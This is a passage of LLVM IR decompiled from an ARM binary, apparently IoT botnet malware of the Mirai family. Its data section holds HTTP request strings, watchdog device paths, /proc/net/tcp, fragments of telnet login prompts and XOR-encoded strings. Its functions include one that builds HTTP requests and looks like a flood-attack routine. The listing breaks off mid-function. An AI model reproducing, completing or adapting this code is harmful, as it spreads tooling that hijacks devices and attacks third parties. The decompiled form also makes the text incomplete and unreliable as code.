source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_eb2c.16 = constant i32 -382906384
@global_var_19780.19 = constant [4 x i8] c"GET\00"
@global_var_19784.21 = constant i32 47
@global_var_15b20.24 = constant i32 -449978364
@global_var_19778.26 = constant i32 32
@global_var_19750.28 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_19768.30 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_19774.32 = constant [3 x i8] c"\0D\0A\00"
@global_var_19788.34 = constant [9 x i8] c"Cookie: \00"
@global_var_19794.36 = constant [3 x i8] c"; \00"
@global_var_197a0.38 = constant i32 59
@global_var_19798.40 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_197a4.42 = constant [5 x i8] c"http\00"
@global_var_197ac.44 = constant [5 x i8] c"url=\00"
@global_var_197b4.46 = constant [5 x i8] c"POST\00"
@global_var_197bc.48 = constant i32 39
@global_var_1234c.49 = constant i32 -439279616
@global_var_197c0.51 = constant i32 61
@global_var_22328.55 = global i32 0
@global_var_a050.56 = constant i32 -352321547
@global_var_13780.57 = constant i32 -382906384
@global_var_2232c.59 = global i32 0
@global_var_22330.60 = local_unnamed_addr global i32 0
@global_var_22334.61 = local_unnamed_addr global i32 0
@global_var_22338.62 = local_unnamed_addr global i32 0
@global_var_2233c.63 = local_unnamed_addr global i32 0
@global_var_22340.64 = local_unnamed_addr global i32 0
@global_var_22344.65 = local_unnamed_addr global i32 0
@global_var_22348.66 = local_unnamed_addr global i32 0
@global_var_d024.72 = constant i32 -382906384
@global_var_d430.74 = constant i32 -382906384
@global_var_c8ec.76 = constant i32 -382906384
@global_var_c270.78 = constant i32 -382906384
@global_var_bbb8.80 = constant i32 -382906384
@global_var_b420.82 = constant i32 -382906384
@global_var_ae40.84 = constant i32 -382906384
@global_var_a7e4.86 = constant i32 -382906384
@global_var_81cc.88 = constant i32 -382906384
@global_var_2290c.90 = global i32 0
@global_var_22914.101 = global i32 0
@global_var_197c4.103 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_2234c.107 = global i32 0
@global_var_22910.109 = global i32 0
@global_var_14dd8.111 = constant i32 -382910336
@global_var_e604.112 = constant i32 -509607932
@global_var_eaa8.114 = constant i32 -382910352
@global_var_222f0.116 = global i32 75232
@global_var_222e8.118 = global i32 -1
@global_var_2291c.124 = local_unnamed_addr global i32 0
@global_var_2291a.125 = local_unnamed_addr global i32 0
@global_var_197d4.128 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_19828.134 = constant [3 x i8] c"/.\00"
@global_var_19804.136 = constant i32 59688
@global_var_e928.137 = constant i32 -382910224
@global_var_11a94.139 = constant i32 -442552176
@global_var_11b34.142 = constant i32 -382906384
@global_var_119f4.144 = constant i32 -442552176
@global_var_19824.149 = constant i32 59664
@global_var_197f8.152 = constant i32 10
@global_var_197e4.155 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_22354.168 = global i32 0
@global_var_22360.170 = global i32 0
@global_var_22358.172 = global i32 0
@global_var_2235c.174 = global i32 0
@global_var_1983c.180 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_fcc0.190 = constant i32 -509607925
@global_var_22930.192 = global i32 0
@global_var_22398.194 = global i32 0
@global_var_22364.196 = global i32 0
@global_var_22390.198 = global i32 0
@global_var_22928.205 = global i32 0
@global_var_2292c.207 = global i32 0
@global_var_2236a.210 = local_unnamed_addr global i32 0
@global_var_2236c.211 = local_unnamed_addr global i32 0
@global_var_22370.212 = local_unnamed_addr global i32 0
@global_var_22371.213 = local_unnamed_addr global i32 0
@global_var_2237c.215 = global i32 0
@global_var_2238a.219 = local_unnamed_addr global i32 0
@global_var_19860.221 = constant [5 x i8] c"PMMV\00"
@global_var_19868.223 = constant i32 387006810
@global_var_19870.225 = constant [6 x i8] c"TKXZT\00"
@global_var_19878.227 = constant [6 x i8] c"CFOKL\00"
@global_var_19880.229 = constant i32 437918234
@global_var_19888.231 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_19890.233 = constant [8 x i8] c"FGDCWNV\00"
@global_var_19898.235 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_198a4.237 = constant i32 370216979
@global_var_198ac.239 = constant i32 269555223
@global_var_198b4.241 = constant [8 x i8] c"QWRRMPV\00"
@global_var_1979c.243 = constant i32 0
@global_var_198bc.245 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_198c8.247 = constant i32 370216979
@global_var_198d0.249 = constant [5 x i8] c"WQGP\00"
@global_var_198d8.251 = constant [5 x i8] c"RCQQ\00"
@global_var_198e0.253 = constant i32 1263486531
@global_var_198ec.255 = constant i32 320017171
@global_var_198f4.257 = constant [9 x i8] c"QOACFOKL\00"
@global_var_19900.259 = constant i32 336860180
@global_var_19908.261 = constant i32 370216979
@global_var_19910.263 = constant i32 324292169
@global_var_19918.265 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_19928.267 = constant [7 x i8] c"OGKLQO\00"
@global_var_19930.269 = constant [8 x i8] c"QGPTKAG\00"
@global_var_19938.271 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_19944.273 = constant [6 x i8] c"EWGQV\00"
@global_var_1994c.275 = constant i32 1263486531
@global_var_19954.277 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_19964.279 = constant [5 x i8] c"W@LV\00"
@global_var_1996c.281 = constant i32 324292169
@global_var_19974.283 = constant i32 390551160
@global_var_1997c.285 = constant i32 387009354
@global_var_19984.287 = constant [6 x i8] c"HT@XF\00"
@global_var_1998c.289 = constant [5 x i8] c"CLIM\00"
@global_var_19994.291 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_1999c.293 = constant i32 1867011861
@global_var_199ac.295 = constant i32 1867011861
@global_var_199bc.297 = constant [7 x i8] c"Q[QVGO\00"
@global_var_199c4.299 = constant [5 x i8] c"KIU@\00"
@global_var_199cc.301 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_199d8.303 = constant [8 x i8] c"PGCNVGI\00"
@global_var_199e0.305 = constant i32 303174162
@global_var_199ec.307 = constant i32 320017171
@global_var_199f4.309 = constant i32 319820054
@global_var_1989c.311 = constant [5 x i8] c"VGAJ\00"
@global_var_199fc.313 = constant [7 x i8] c"OMVJGP\00"
@global_var_19a04.315 = constant [7 x i8] c"DWAIGP\00"
@global_var_22374.316 = local_unnamed_addr global i32 0
@global_var_22378.317 = local_unnamed_addr global i32 0
@global_var_22372.318 = local_unnamed_addr global i32 0
@global_var_22380.320 = local_unnamed_addr global i32 0
@global_var_2238c.321 = local_unnamed_addr global i32 0
@global_var_fdc0.323 = constant i32 -382910352
@global_var_19a14.326 = constant [5 x i8] c"ogin\00"
@global_var_19a1c.328 = constant [8 x i8] c"assword\00"
@global_var_19a2d.330 = constant i32 1377827839
@global_var_19a24.332 = constant i32 2095871
@global_var_19a0c.337 = constant [6 x i8] c"enter\00"
@global_var_22938.339 = global i32 0
@global_var_222f8.342 = global i32 -559038737
@global_var_19a30.346 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_22950.348 = local_unnamed_addr global i32 0
@global_var_22954.349 = local_unnamed_addr global i32 0
@global_var_19a40.351 = constant i32 802
@global_var_22958.352 = local_unnamed_addr global i32 0
@global_var_2295c.353 = local_unnamed_addr global i32 0
@global_var_229c8.354 = local_unnamed_addr global i32 0
@global_var_229cc.355 = local_unnamed_addr global i32 0
@global_var_19a44.357 = constant i32 36254
@global_var_229d0.358 = local_unnamed_addr global i32 0
@global_var_229d4.359 = local_unnamed_addr global i32 0
@global_var_19a48.361 = constant i32 1448168270
@global_var_22948.362 = local_unnamed_addr global i32 0
@global_var_2294c.363 = local_unnamed_addr global i32 0
@global_var_19a58.365 = constant i32 1381389898
@global_var_22964.366 = local_unnamed_addr global i32 0
@global_var_22960.367 = local_unnamed_addr global i32 0
@global_var_19a78.369 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_22968.370 = local_unnamed_addr global i32 0
@global_var_2296c.371 = local_unnamed_addr global i32 0
@global_var_19a80.373 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_22970.374 = local_unnamed_addr global i32 0
@global_var_22974.375 = local_unnamed_addr global i32 0
@global_var_19a88.377 = constant i32 1195772418
@global_var_22978.378 = local_unnamed_addr global i32 0
@global_var_2297c.379 = local_unnamed_addr global i32 0
@global_var_19a94.381 = constant [5 x i8] c"\0DDF\22\00"
@global_var_22984.382 = local_unnamed_addr global i32 0
@global_var_22980.383 = local_unnamed_addr global i32 0
@global_var_19a9c.385 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_22988.386 = local_unnamed_addr global i32 0
@global_var_2298c.387 = local_unnamed_addr global i32 0
@global_var_19aa4.389 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_22990.390 = local_unnamed_addr global i32 0
@global_var_22994.391 = local_unnamed_addr global i32 0
@global_var_19ab0.393 = constant i32 1836214128
@global_var_22998.394 = local_unnamed_addr global i32 0
@global_var_2299c.395 = local_unnamed_addr global i32 0
@global_var_19ac0.397 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_229a0.398 = local_unnamed_addr global i32 0
@global_var_229a4.399 = local_unnamed_addr global i32 0
@global_var_19acc.401 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_229a8.402 = local_unnamed_addr global i32 0
@global_var_229ac.403 = local_unnamed_addr global i32 0
@global_var_19ad8.405 = constant i32 437738110
@global_var_229b4.406 = local_unnamed_addr global i32 0
@global_var_229b0.407 = local_unnamed_addr global i32 0
@global_var_19afc.409 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_229b8.410 = local_unnamed_addr global i32 0
@global_var_229bc.411 = local_unnamed_addr global i32 0
@global_var_19b08.413 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_229c0.414 = local_unnamed_addr global i32 0
@global_var_229c4.415 = local_unnamed_addr global i32 0
@global_var_19b14.417 = constant [7 x i8] c"QJGNN\22\00"
@global_var_229d8.418 = local_unnamed_addr global i32 0
@global_var_229dc.419 = local_unnamed_addr global i32 0
@global_var_19b1c.421 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_229e0.422 = local_unnamed_addr global i32 0
@global_var_229e4.423 = local_unnamed_addr global i32 0
@global_var_19b24.425 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_229e8.426 = local_unnamed_addr global i32 0
@global_var_229ec.427 = local_unnamed_addr global i32 0
@global_var_19b2c.429 = constant [4 x i8] c"QJ\22\00"
@global_var_229f4.430 = local_unnamed_addr global i32 0
@global_var_229f0.431 = local_unnamed_addr global i32 0
@global_var_19b30.433 = constant i32 1280000013
@global_var_229f8.434 = local_unnamed_addr global i32 0
@global_var_229fc.435 = local_unnamed_addr global i32 0
@global_var_19b44.437 = constant i32 1668311919
@global_var_22a04.438 = local_unnamed_addr global i32 0
@global_var_22a00.439 = local_unnamed_addr global i32 0
@global_var_19b60.441 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_22a08.442 = local_unnamed_addr global i32 0
@global_var_22a0c.443 = local_unnamed_addr global i32 0
@global_var_19b6c.445 = constant i32 1280000013
@global_var_22a10.446 = local_unnamed_addr global i32 0
@global_var_22a14.447 = local_unnamed_addr global i32 0
@global_var_19b80.449 = constant i32 1280000013
@global_var_22a18.450 = local_unnamed_addr global i32 0
@global_var_22a1c.451 = local_unnamed_addr global i32 0
@global_var_19b98.453 = constant i32 1464693110
@global_var_22a24.454 = local_unnamed_addr global i32 0
@global_var_22a20.455 = local_unnamed_addr global i32 0
@global_var_19bb0.457 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_22a28.458 = local_unnamed_addr global i32 0
@global_var_22a2c.459 = local_unnamed_addr global i32 0
@global_var_19bc4.461 = constant i32 1196376908
@global_var_22a30.462 = local_unnamed_addr global i32 0
@global_var_22a34.463 = local_unnamed_addr global i32 0
@global_var_19bd4.465 = constant i32 1280068961
@global_var_22a38.466 = local_unnamed_addr global i32 0
@global_var_19bec.468 = constant i32 1195458915
@global_var_22a40.469 = local_unnamed_addr global i32 0
@global_var_19c40.471 = constant i32 1195458915
@global_var_22a48.472 = local_unnamed_addr global i32 0
@global_var_19c64.474 = constant i32 1447841121
@global_var_22a50.475 = local_unnamed_addr global i32 0
@global_var_19c98.477 = constant i32 1633044305
@global_var_22a58.478 = local_unnamed_addr global i32 0
@global_var_19ca8.480 = constant i32 1346651984
@global_var_22a60.481 = local_unnamed_addr global i32 0
@global_var_19cb4.483 = constant i32 1128353102
@global_var_22a68.484 = local_unnamed_addr global i32 0
@global_var_19cc0.486 = constant i32 257312593
@global_var_22a70.487 = local_unnamed_addr global i32 0
@global_var_19cd0.489 = constant i32 1447841089
@global_var_22a78.490 = local_unnamed_addr global i32 0
@global_var_19ce4.492 = constant i32 1279479894
@global_var_22a80.493 = local_unnamed_addr global i32 0
@global_var_19cf8.495 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_22a88.496 = local_unnamed_addr global i32 0
@global_var_19be0.498 = constant i32 1380403017
@global_var_22a90.499 = local_unnamed_addr global i32 0
@global_var_19d04.501 = constant i32 1280068929
@global_var_22a98.502 = local_unnamed_addr global i32 0
@global_var_19d14.504 = constant i32 1414547281
@global_var_22aa0.505 = local_unnamed_addr global i32 0
@global_var_19d28.507 = constant i32 1414547281
@global_var_22aa8.508 = local_unnamed_addr global i32 0
@global_var_19d44.510 = constant i32 1264078191
@global_var_22ab0.511 = local_unnamed_addr global i32 0
@global_var_19db4.513 = constant i32 1264078191
@global_var_22ab8.514 = local_unnamed_addr global i32 0
@global_var_19e24.516 = constant i32 1264078191
@global_var_22ac0.517 = local_unnamed_addr global i32 0
@global_var_19e94.519 = constant i32 1264078191
@global_var_22ac8.520 = local_unnamed_addr global i32 0
@global_var_19f04.522 = constant i32 1264078191
@global_var_22ad0.523 = local_unnamed_addr global i32 0
@global_var_227cc.525 = global i32 0
@global_var_22aec.528 = local_unnamed_addr global i32 0
@global_var_22ad8.530 = local_unnamed_addr global i32 0
@global_var_22b10.532 = local_unnamed_addr global i32 0
@global_var_22af4.533 = local_unnamed_addr global i32 0
@global_var_2239c.535 = global i32 0
@global_var_223a0.537 = global i32 0
@global_var_19f7c.540 = constant [10 x i8] c"/dev/null\00"
@global_var_22ae4.542 = local_unnamed_addr global i32 0
@global_var_222b4.545 = global i32 33036
@global_var_222b8.547 = global i32 32968
@global_var_12e98.548 = constant i32 -352321519
@global_var_12f48.555 = constant i32 -450007036
@global_var_22ae8.558 = local_unnamed_addr global i32 0
@global_var_223b8.560 = global i32 0
@global_var_223bc.562 = global i32 0
@global_var_227c0.568 = global i32 0
@global_var_227c4.572 = global i32 0
@global_var_19f86.576 = constant i32 35062016
@global_var_223ac.578 = global i32 0
@global_var_223a8.580 = global i32 0
@global_var_223b0.581 = global i32 0
@global_var_145f4.586 = constant i32 -516948194
@global_var_14b08.597 = constant i32 -450007036
@global_var_14c64.599 = constant i32 -509607923
@global_var_19fb0.602 = constant i32 -1
@global_var_19fa8.604 = constant i32 2147483647
@global_var_15790.607 = constant i32 -449978364
@global_var_227c8.611 = global i32 0
@global_var_19fb8.613 = constant [10 x i8] c"LINUX_2.6\00"
@global_var_19fc4.615 = constant [21 x i8] c"__vdso_clock_gettime\00"
@global_var_15a58.617 = constant i32 -382910336
@global_var_222fc.622 = global i32 0
@global_var_15ca8.623 = constant i32 -484573183
@global_var_22300.626 = global i32 0
@global_var_15cfc.627 = constant i32 -509595648
@global_var_22304.629 = global i32 0
@global_var_15d70.630 = constant i32 -300085392
@global_var_22b14.632 = global i32 0
@global_var_22b20.633 = local_unnamed_addr global i32 0
@global_var_22b18.634 = local_unnamed_addr global i32 0
@global_var_22b1c.636 = local_unnamed_addr global i32 0
@global_var_22af0.638 = local_unnamed_addr global i32 0
@global_var_227d0.640 = global i32 0
@global_var_22af8.642 = global i32 0
@global_var_19fe6.644 = constant i32 -1
@global_var_19fe5.646 = constant i32 -1
@global_var_19fdc.648 = constant i32 67240192
@global_var_228ec.653 = global i32 0
@global_var_228e8.656 = global i32 0
@global_var_228f4.658 = global i32 0
@global_var_22ae0.661 = local_unnamed_addr global i32 0
@global_var_228f0.663 = global i32 0
@global_var_17334.683 = constant i32 -382910352
@global_var_228fc.685 = global i32 0
@global_var_22904.688 = global i32 0
@global_var_22900.691 = global i32 0
@global_var_222c0.693 = global i32 0
@global_var_22308.3 = external global i8*
@global_var_22324.53 = external global i8*
@global_var_22325.70 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_222f4.120 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_22918.123 = global i16* null
@global_var_22394.200 = global i16* null
@global_var_22368.209 = external global i8*
@global_var_22388.216 = local_unnamed_addr global i8 0
@global_var_2237e.217 = local_unnamed_addr global i16 0
@global_var_22389.218 = local_unnamed_addr global i8 0
@global_var_22adc.527 = external global i8*

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
  %v3_80b4 = load i32, i32* @r0, align 4
  ret i32 %v3_80b4
}

define i32 @function_80c8(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80c8 = load i32, i32* @r4, align 4
  store i32 %v3_80c8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22308.3 to i32), i32* %r4.global-to-local, align 4
  %v2_80d0 = load i8, i8* bitcast (i8** @global_var_22308.3 to i8*), align 4
  %v2_80d4 = icmp eq i8 %v2_80d0, 0
  br i1 %v2_80d4, label %dec_label_pc_80dc, label %dec_label_pc_80f8

dec_label_pc_80dc:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80ec = call i32 @function_8104()
  %v2_80f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_80f4 = inttoptr i32 %v2_80f4 to i8*
  store i8 1, i8* %v3_80f4, align 1
  %v2_80f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80f8

dec_label_pc_80f8:                                ; preds = %entry, %dec_label_pc_80dc
  %v2_80f8 = phi i32 [ %v2_80f8.pre, %dec_label_pc_80dc ], [ %v3_80c8, %entry ]
  %.0 = phi i32 [ %v3_80ec, %dec_label_pc_80dc ], [ undef, %entry ]
  store i32 %v2_80f8, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_22308.3, { 1, 0 }
  uselistorder label %dec_label_pc_80f8, { 1, 0 }
}

define i32 @function_8104() local_unnamed_addr {
dec_label_pc_8104:
  %v0_8108 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8108, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_8104
  %v1_8108 = load i32, i32* @r2, align 4
  %v2_8108 = trunc i32 %v1_8108 to i16
  %v4_8108 = inttoptr i32 %v1_8108 to i16*
  store i16 %v2_8108, i16* %v4_8108, align 2
  br label %bb3

bb3:                                              ; preds = %bb, %dec_label_pc_8104
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8130 = load i32, i32* inttoptr (i32 139964 to i32*), align 4
  %v2_8134 = icmp eq i32 %v2_8130, 0
  br i1 %v2_8134, label %dec_label_pc_814c, label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %bb3
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_814c

dec_label_pc_814c:                                ; preds = %bb3, %dec_label_pc_813c
  ret i32 139964

; uselistorder directives
  uselistorder label %dec_label_pc_814c, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v3_8188 = call i32 @function_8190(i32* nonnull %stack_var_0, i32 0)
  ret i32 %v3_8188
}

define i32 @function_8190(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8190:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_8190 = load i32, i32* @lr, align 4
  %v2_81a0 = load i32, i32* %arg1, align 4
  %v1_81a4 = add i32 %tmp, 4
  %v7_81bc = inttoptr i32 %v1_81a4 to i32*
  %v8_81bc = call i32 @function_12cb4(i32 ptrtoint (i32* @global_var_eb2c.16 to i32), i32 %v2_81a0, i32* %v7_81bc, i32 32948, i32 104236, i32 0, i32 %v0_8190)
  ret i32 %v8_81bc
}

define i32 @function_81cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81cc = load i32, i32* @r4, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81f8 = inttoptr i32 %arg4 to i32*
  %v6_81f8 = call i32 @function_9f04(i32 %arg3, i32* %v5_81f8, i32 21, i32 0, i32 %arg2)
  %v0_81fc = load i32, i32* @r5, align 4
  store i32 %v0_81fc, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8208 = load i32, i32* @r4, align 4
  store i32 %v0_8208, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), i32* %r3.global-to-local, align 4
  %v6_8210 = inttoptr i32 %v0_81fc to i32*
  %v7_8210 = call i32 @function_9f04(i32 %v0_8208, i32* %v6_8210, i32 20, i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), i32 %v6_81f8)
  %v0_8214 = load i32, i32* @r5, align 4
  store i32 %v0_8214, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8210, i32* @sl, align 4
  %v0_8224 = load i32, i32* @r4, align 4
  store i32 %v0_8224, i32* %r0.global-to-local, align 4
  %v5_8228 = inttoptr i32 %v0_8214 to i32*
  %v6_8228 = call i32 @function_9f04(i32 %v0_8224, i32* %v5_8228, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_822c = load i32, i32* @r5, align 4
  store i32 %v0_822c, i32* %r1.global-to-local, align 4
  store i32 %v6_8228, i32* @r8, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8238 = load i32, i32* @r4, align 4
  store i32 %v0_8238, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19784.21 to i32), i32* %r3.global-to-local, align 4
  %v5_8240 = inttoptr i32 %v0_822c to i32*
  %v6_8240 = call i32 @function_9f04(i32 %v0_8238, i32* %v5_8240, i32 22, i32 ptrtoint (i32* @global_var_19784.21 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8244 = load i32, i32* @r5, align 4
  store i32 %v0_8244, i32* %r1.global-to-local, align 4
  store i32 %v6_8240, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8250 = load i32, i32* @r4, align 4
  store i32 %v0_8250, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8258 = inttoptr i32 %v0_8244 to i32*
  %v5_8258 = call i32 @function_a430(i32 %v0_8250, i32* %v4_8258, i32 24, i32 1)
  %v0_825c = load i32, i32* @r5, align 4
  store i32 %v0_825c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8258, i32* @r6, align 4
  %v0_826c = load i32, i32* @r4, align 4
  store i32 %v0_826c, i32* %r0.global-to-local, align 4
  %v4_8270 = inttoptr i32 %v0_825c to i32*
  %v5_8270 = call i32 @function_a430(i32 %v0_826c, i32* %v4_8270, i32 7, i32 80)
  %v2_8278 = ptrtoint i32* %stack_var_-20813 to i32
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_828c = urem i32 %v5_8270, 65536
  store i32 %v3_828c, i32* %r3.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_829c = bitcast i32* %stack_var_-20813 to i8*
  %v4_829c = call i32 @function_15548(i8* %v3_829c, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_81cc
  %v1_82a4 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb157, label %dec_label_pc_82c4

.thread13:                                        ; preds = %dec_label_pc_81cc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb157:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb157, %dec_label_pc_82e4, %.thread13, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread13 ], [ %v4_829c, %bb157 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81cc, i32* %r4.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @function_12324(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @r8, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @function_12324(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sl, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @function_12324(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
